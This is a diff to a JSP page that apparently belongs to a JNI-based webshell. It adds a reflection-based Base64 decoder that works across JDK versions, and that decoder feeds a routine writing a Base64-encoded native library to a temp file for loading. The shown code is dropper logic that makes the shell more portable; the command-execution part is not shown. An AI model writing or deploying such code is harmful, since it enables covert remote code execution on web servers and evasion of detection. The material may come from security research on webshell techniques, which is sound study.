@@ -8,7 +8,6 @@
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%@ page import="java.io.File" %>
 <%@ page import="java.lang.reflect.Method" %>
-<%@ page import="sun.misc.BASE64Decoder" %>
 <%@ page import="java.io.IOException" %>
 <%@ page import="java.io.FileOutputStream" %>
 <%!
@@ -53,17 +52,37 @@
     }
 
     /**
+     * 高版本JDKsun.misc.BASE64Decoder已经被移除，低版本JDK又没有java.util.Base64对象，
+     * 所以还不如直接反射自动找这两个类，哪个存在就用那个decode。
+     * @param str
+     * @return
+     */
+    byte[] base64Decode(String str) {
+        try {
+            try {
+                Class clazz = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
+            } catch (ClassNotFoundException e) {
+                Class  clazz   = Class.forName("java.util.Base64");
+                Object decoder = clazz.getMethod("getDecoder").invoke(null);
+                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
+            }
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    /**
      * 写JNI链接库文件
      * @param base64 JNI动态库Base64
      * @return 返回是否写入成功
      */
     void writeJNILibFile(String base64) throws IOException {
         if (base64 != null) {
-
             File jniFile = getTempJNILibFile();
 
             if (!jniFile.exists()) {
-                byte[] bytes = new BASE64Decoder().decodeBuffer(base64);
+                byte[] bytes = base64Decode(base64);
 
                 if (bytes != null) {
                     FileOutputStream fos = new FileOutputStream(jniFile);
